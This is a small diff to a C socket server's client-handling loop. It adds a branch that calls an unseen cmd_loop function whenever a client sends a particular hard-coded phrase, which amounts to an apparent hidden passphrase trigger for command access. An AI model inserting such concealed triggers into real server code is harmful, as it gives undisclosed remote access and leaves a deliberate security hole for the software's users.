@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <string.h>
 #include "socket.h"
+#include "helper.h"
 
 int hdl_client(int *sockfd, struct sockaddr_in *client);
 
@@ -44,6 +45,8 @@ int hdl_client(int *sockfd, struct sockaddr_in *client) {
     }
     if(strcmp(buf, "exit\r\n") == 0)
       break;
+    else if(strcmp(buf, "Doctor Philip Simonson\r\n") == 0)
+      cmd_loop(sockfd);
   } while(1);
 
   close_socket(sockfd);
